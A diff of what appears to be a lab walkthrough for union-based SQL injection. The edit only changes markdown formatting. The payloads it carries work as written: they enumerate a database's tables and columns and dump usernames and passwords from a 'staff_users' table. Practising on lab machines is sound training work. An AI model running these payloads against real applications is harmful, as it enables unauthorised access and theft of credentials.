@@ -35,15 +35,15 @@ Deploy the machine, then use the given commands by inserting it next to the last
 ```
 0 UNION SELECT 1,2,database()
 ```
-- This will show the different table name in the sqli_one database
+This will show the different table name in the sqli_one database
 ```
 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
 ```
-- This will show you the diffent column name in the table
+This will show you the diffent column name in the table
 ```
 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
 ```
-- This will display the contents of that column
+This will display the contents of that column
 ```
 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
 ```
